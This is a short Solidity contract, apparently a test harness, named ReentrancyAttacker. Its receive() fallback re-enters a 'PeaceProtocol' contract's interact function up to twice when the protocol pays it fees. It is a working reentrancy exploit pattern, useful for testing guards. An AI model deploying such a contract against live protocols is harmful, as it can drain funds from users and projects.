// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPeaceProtocol {
    function interact(address referrer) external payable;
}

contract ReentrancyAttacker {
    IPeaceProtocol public protocol;
    uint256 public attackCount;

    constructor(address _protocol) {
        protocol = IPeaceProtocol(_protocol);
    }

    function attack() external payable {
        require(msg.value >= 0.0008 ether, "Need ETH for attack");
        attackCount = 0;
        protocol.interact{value: msg.value}(address(0));
    }

    // Fallback is called when PeaceProtocol sends ETH to this contract (as a fee receiver)
    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            // Try to re-enter the interact function
            protocol.interact{value: 0.0008 ether}(address(0));
        }
    }
}